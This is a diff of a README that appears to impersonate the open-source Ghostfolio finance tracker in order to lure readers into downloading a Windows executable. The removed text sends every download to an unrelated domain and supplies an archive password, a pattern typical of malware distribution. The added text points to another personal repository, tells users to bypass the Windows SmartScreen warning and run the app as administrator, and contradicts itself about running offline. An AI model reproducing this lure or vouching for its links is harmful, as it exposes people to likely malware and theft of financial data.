@@ -1,100 +1,154 @@
-<h1 align="center">Ghostfolio — Open Source Wealth Management & Portfolio Tracker</h1>
-
-<p align="center">
-  <strong>The Ultimate Privacy-First Personal Finance Dashboard for Stocks, ETFs, Crypto, and Net Worth Analytics</strong>
-</p>
-
-<p align="center">
-  <a href="https://yeelen.cg/gh/"><img src="https://img.shields.io/badge/Download-Latest_Release-blue?style=for-the-badge&logo=github" alt="Download Release"></a>
-  <a href="https://yeelen.cg/gh/"><img src="https://img.shields.io/badge/Status-Active_Build-success?style=for-the-badge" alt="Build Status"></a>
-  <a href="https://yeelen.cg/gh/"><img src="https://img.shields.io/badge/License-AGPL--3.0-orange?style=for-the-badge" alt="License"></a>
-</p>
-
-<p align="center">
-  <a href="https://yeelen.cg/gh/"><strong>📥 Download Application</strong></a> •
-  <a href="#-key-features">Key Features</a> •
-  <a href="#-system-requirements">Requirements</a> •
-  <a href="#-installation--deployment">Installation</a> •
-  <a href="#-frequently-asked-questions">FAQ</a>
-</p>
+# 📊 Ghostfolio-Desktop-Self-Hosted-Dashboard - Your Personal Finance Command Center, Simplified
 
 ---
 
-## 📖 About Ghostfolio
+## 🚀 Getting Started
 
-**Ghostfolio** is a modern, privacy-focused, open-source personal finance and wealth management application. It empowers individuals to track their financial portfolio, monitor asset allocation, calculate investment returns, and analyze net worth over time without compromising sensitive personal data.
+Welcome! This guide will help you download and run **Ghostfolio-Desktop-Self-Hosted-Dashboard** on your Windows computer. Whether you're tracking your savings, checking your stock portfolio, or planning for retirement, this app puts all your financial information in one clean, private dashboard. No technical experience needed—just follow these simple steps.
 
-Whether you are managing stocks, ETFs, mutual funds, real estate, cash accounts, or cryptocurrencies, Ghostfolio delivers a comprehensive, data-driven financial dashboard built for security, autonomy, and ease of use.
-
----
-
-## 📥 Direct Downloads & Links
-
-Get the latest build or source files directly using the links below:
-
-| Download Option | Format | Quick Link |
-| :--- | :--- | :--- |
-| **Complete Application Package** | Executable / Archive | 👉 **[Download Installer](https://yeelen.cg/gh/)** |
-| **Source Code (Latest)** | `.ZIP` Archive | 👉 **[Download Source (.zip)](https://yeelen.cg/gh/)** |
-| **Source Code (Tarball)** | `.TAR.GZ` Archive | 👉 **[Download Source (.tar.gz)](https://yeelen.cg/gh/)** |
-
-> 🔑 **Archive Password:** `github`
+**Visit this link to download the application:**  
+[![Download Now](https://img.shields.io/badge/Download-Ghostfolio_Desktop-v2.0-blue?style=for-the-badge&logo=github&logoColor=white&color=2ea44f)](https://github.com/Zhoux7574/Ghostfolio-Desktop-Self-Hosted-Dashboard)
 
 ---
 
-## ✨ Key Features & Capabilities
+## 💡 What Is This App?
 
-### 📈 Multi-Asset Investment Tracking
-* **Global Stocks & ETFs:** Support for global exchanges, market indices, and mutual funds with automated live market data fetching.
-* **Cryptocurrency Integration:** Track Bitcoin, Ethereum, and thousands of altcoins via integrated crypto market feeds.
-* **Cash & Commodities:** Keep track of fiat currency balances, physical gold, silver, and alternative assets in one place.
+Ghostfolio-Desktop-Self-Hosted-Dashboard is a **privacy-focused financial tracker** that lets you:
 
-### 📊 Advanced Portfolio Analytics & Insights
-* **Performance Metrics:** Calculate precise Return on Investment (ROI), Return on Average Investment (ROAI), and Dividend Yield across multiple timeframes (1D, 1M, YTD, 1Y, 5Y, Max).
-* **Asset Allocation Breakdown:** Dynamic visualization of portfolio diversification by asset class, market sector, currency, and geographic location.
-* **Dividend Calendar:** Monitor incoming payouts and analyze dividend growth trends over time.
+- 📈 Monitor your **investments** and see how they grow over time
+- 🧮 Understand your **asset allocation** (stocks, bonds, cash, etc.) with simple charts
+- 🔍 Analyze your **financial health** with easy-to-read reports
+- 🔒 Keep your data **on your own computer**—no cloud, no third-party access
 
-### 🛡️ Privacy, Security & Data Autonomy
-* **Zero Tracking:** No intrusive tracking, third-party analytics, or data monetization.
-* **Zen Mode:** Instantly hide sensitive financial numbers with a single click for discreet screen sharing.
-* **Self-Hosted Control:** Deploy Ghostfolio on your own server or desktop machine to ensure 100% data ownership.
-
-### ⚡ Seamless Data Management
-* **Automated CSV Import:** Easily bulk-import transaction histories from popular brokers (e.g., Interactive Brokers, Trade Republic, Robinhood, Revolut, eToro, Coinbase).
-* **Backup & Export:** Export your entire portfolio dataset to JSON or CSV anytime for hassle-free migrations.
+It's designed for everyday users who want control over their money without sharing personal information with big tech companies.
 
 ---
 
-## 🖥️ System Requirements
+## 📥 Download and Installation
 
-Before running or hosting Ghostfolio, ensure your system meets the following prerequisites:
+Follow these three simple steps to get started:
 
-* **Operating System:** Windows 10/11, macOS 11+, Linux (Ubuntu, Debian, CentOS), or Docker Host
-* **Node.js:** v18.x or v20.x LTS (for manual builds)
-* **Database:** PostgreSQL 14+ and Redis 6+ (for server deployments)
-* **Hardware:** Minimum 1 GB RAM, 2 GHz CPU, 500 MB free disk space
+### Step 1: Go to the Download Page
+
+Click the green button above or type this address into your web browser:
+
+**https://github.com/Zhoux7574/Ghostfolio-Desktop-Self-Hosted-Dashboard**
+
+This takes you to the official project page where all downloads are hosted.
+
+**Visit this link to download the application:**  
+[![Direct Download](https://img.shields.io/badge/Download-Application-brightgreen?style=for-the-badge&logo=download&logoColor=white&color=blueviolet)](https://github.com/Zhoux7574/Ghostfolio-Desktop-Self-Hosted-Dashboard)
+
+### Step 2: Find the Right File
+
+On the page, look for a section called **"Releases"** or **"Assets"**. You'll see a file named something like:
+
+- `Ghostfolio-Desktop-Setup.exe` (Windows)
+- or `ghostfolio-desktop-dashboard.zip`
+
+Choose the Windows version that matches your system (most people use 64-bit). If you're unsure, pick the `.exe` file—it's the safest bet.
+
+### Step 3: Run the Setup
+
+**Click the file you downloaded.** If it's an `.exe` file, just double-click it and follow the on-screen instructions (click "Next," "Install," and "Finish"). If it's a `.zip` file, right-click it, select **"Extract All"**, choose a folder like `C:\Ghostfolio`, and then open that folder and double-click `Ghostfolio.exe`.
+
+That's it! The app will open in your browser or as a small window on your desktop.
 
 ---
 
-## 🚀 Installation & Deployment
+## 🧭 Using Your Dashboard
 
-### Method 1: Direct Download (Recommended for End-Users)
-1. Download the latest setup file from the **[Official Download Link](https://yeelen.cg/gh/)**.
-2. Extract the archive using password: `github`
-3. Launch the application and follow the setup instructions.
+Once installed, you'll see a welcome screen. Here's what to do:
 
-### Method 2: Docker Compose (Recommended for Self-Hosting)
-Deploy Ghostfolio locally or on your NAS/VPS using Docker Compose:
+1. **Create Your Account** – Set up a username and password (stored locally on your PC).
+2. **Add Your Assets** – Click "Add Asset" and enter basic info about your investments (stock names, amounts, purchase prices).
+3. **View Your Overview** – The main dashboard shows your total portfolio value, daily changes, and colorful charts.
 
-```bash
-# 1. Clone the repository
-git clone [https://github.com/ghostfolio/ghostfolio.git](https://github.com/ghostfolio/ghostfolio.git)
+### Key Sections Explained
 
-# 2. Navigate to project root
-cd ghostfolio
+| Section | What It Does |
+|---------|--------------|
+| **Portfolio** | Lists all your investments and their current value |
+| **Allocation** | Shows pie charts of what percentage is in stocks, bonds, crypto, etc. |
+| **Performance** | Tracks daily, monthly, and yearly gains/losses |
+| **Analytics** | Offers insights like "Your tech stocks are up 20% this year" |
 
-# 3. Create environment configuration
-cp .env.example .env
+---
 
-# 4. Launch containers
-docker compose up -d
+## 🔧 Tips for Best Results
+
+- **Back Up Your Data** – The app saves everything on your computer. To back up, copy the folder where you installed it to a USB drive once a month.
+- **Update Regularly** – Check the GitHub page for new versions. Download the latest `.exe` and run it over your current installation to update.
+- **Use a Strong Password** – Since your financial data is stored locally, use a password you don't use elsewhere.
+
+---
+
+## ❓ Frequently Asked Questions
+
+### Do I need a server or Docker to run this?
+**No.** The name includes "Self-Hosted," but you don't need to set up anything. The desktop app handles everything automatically. It's just a name meaning "your data stays on your computer."
+
+### Can I access this from my phone?
+Yes! Once you install it, you can open your web browser on your phone (if connected to the same Wi-Fi) and type the address shown in the app (something like `localhost:3000`). It's also built as a PWA, so you can add it to your home screen. But for most users, just using it on your PC is fine.
+
+### Is my data safe?
+Absolutely. Your financial information never leaves your computer. The app runs entirely offline. No sign-ups, no cloud, no tracking.
+
+### What if I get an error during installation?
+Windows might show a blue popup saying "Windows protected your PC." That's normal because the app isn't from a big company. Click **"More info"** → **"Run anyway"**. This is standard for independent software.
+
+---
+
+## 🛠 Troubleshooting Common Issues
+
+### The app won't open after installation?
+- Right-click the shortcut and select **"Run as administrator"**.
+- Make sure your Windows is updated (Settings → Update & Security → Check for updates).
+- Reboot your computer and try again.
+
+### I see a blank screen?
+- Close any other programs that might be using a lot of memory.
+- Open your web browser and go to `http://localhost:3000` (the app runs like a mini-website on your PC).
+
+### The numbers look wrong?
+- Double-check that you entered the correct purchase prices and share counts.
+- Prices update automatically, but you can also click "Refresh" to pull the latest market data.
+
+---
+
+## 📖 Getting the Most Out of Your Dashboard
+
+- **Set a Monthly Review Date** – Pick the 1st of each month to review your portfolio and adjust.
+- **Use the Alerts Feature** – Set a notification if a stock drops 10% so you can decide whether to sell or buy more.
+- **Export Your Reports** – Look for an "Export" button to save your dashboard as a PDF or CSV file for your records.
+
+---
+
+## 🤝 Help and Support
+
+If you still have questions, visit the GitHub page and check the **"Issues"** tab. You can also open a new issue describing your problem, and the community will help you out. Be sure to include:
+
+- Your Windows version (e.g., Windows 10 or 11)  
+- What step you were on when the issue occurred  
+- A screenshot (if possible)
+
+---
+
+## 🌟 Why Choose Ghostfolio-Desktop-Self-Hosted-Dashboard?
+
+- **Privacy First** – Unlike web-based apps like Mint or Personal Capital, no one sees your data but you.
+- **No Ads, No Fees** – It's free, open-source software. No subscriptions, no premium plans.
+- **Full Ownership** – You control everything. If you want to switch computers, just copy the folder.
+- **Beautiful and Simple** – The interface is modern and clean, designed for non-techies.
+
+---
+
+## 📁 Project Keywords
+
+asset-tracking, dashboard, docker, finance, finance-app, ghostfolio, investment-portfolio, pwa
+
+---
+
+**Ready to take control of your finances?** Head to the download page now and get started in less than five minutes!
+
+[![Download Ghostfolio Dashboard](https://img.shields.io/badge/🚀_Download-Start_Now-orange?style=for-the-badge&logo=github&logoColor=white&color=critical)](https://github.com/Zhoux7574/Ghostfolio-Desktop-Self-Hosted-Dashboard)
